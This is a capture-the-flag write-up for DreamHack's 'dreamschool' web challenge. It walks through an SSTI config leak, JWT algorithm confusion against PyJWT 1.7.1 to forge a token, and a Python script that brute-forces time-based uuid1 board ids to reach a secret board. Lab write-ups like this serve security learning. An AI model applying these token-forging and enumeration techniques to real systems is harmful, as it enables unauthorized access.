# dreamschool — DreamHack

> **Room / Challenge:** dreamschool (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** DreamHack
- **Challenge:** dreamschool (web)
- **Link**: `https://dreamhack.io/wargame/challenges/259`
- **Level:** `7`
- **Date:** `28-11-2025`

---

## Goal

Examining the code, leveraging SSTI, brute-forcing the secret board id and get the flag.

## My Solution

The app is a complicated one, but it is vulnerable to SSTI related to error handling I suggest you examining the code and force the app returns the config of the app.

From this you can get 2 important variables `AUTH_PUBLIC_KEY` and `FLAG_SCHOOL`. You will take this and create the JWT, since the app is using `PyJWT==1.7.1`, this library JWT is vulnerable to algorithm confusion, so we can force the server to decode a token using HS256. With this code:

```python
token = jwt.encode(payload, key=public_key, algorithm="HS256").decode('utf-8')
```

Then we received a token, when we visit `/s/dreamuniversity`

![Guide image](./screenshots/1.png)

It has a two-factor authentication, however we don't know the creds we use token to access to the school, in `models.py`, we know that the free board and secret board using `uuidv1` to create their ids:

```python
free_board_id, secret_board_id = uuid.uuid1(), uuid.uuid1()
```

`uuidv1` is well-known for its vulnerability related to time based. Read this for more information: [https://medium.com/@iason.tzortzis/why-uuidv1-should-not-be-used-to-generate-security-tokens-explained-22f8867ea695](https://medium.com/@iason.tzortzis/why-uuidv1-should-not-be-used-to-generate-security-tokens-explained-22f8867ea695)

Therefore, we can easily brute-force the ids of the secret board based on the id of free board id. My brute-force script:

```python
import requests

# 1. Config
BASE_URL = "http://host8.dreamhack.games:13295"
TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NjQyOTQyOTEsImV4cCI6MTc2NDI5Nzg5MSwidXNlcm5hbWUiOiJqYW1lc2thb2lzIiwic2Nob29sIjoiXHViNGRjXHViOWJjXHViMzAwXHVkNTU5XHVhZDUwIn0.KzSV2HZaYwpFgsxgNIEif9GkewSI-xmhFnyR5CfRkLI"

free_uuid = "7dfbd124-cbfa-11f0-995f-aafc00002f01"
school = "DreamUniversity"

parts = free_uuid.split('-')
start_hex = int(parts[0], 16)

cookies = {"token": TOKEN}

# Scan the next 500 possibilities (usually found within +10)
for offset in range(1, 500):
    next_val = start_hex + offset
    parts[0] = f"{next_val:08x}"
    guess_uuid = "-".join(parts)

    url = f"{BASE_URL}/s/{school}/{guess_uuid}"

    res = requests.get(url, cookies=cookies, timeout=2)
    if res.status_code == 200:
        print(f"\nFOUND SECRET BOARD!")
        print(f"URL: {url}")
        break
```

Access to the found secret board and get the flag:

![Guide image](./screenshots/2.png)
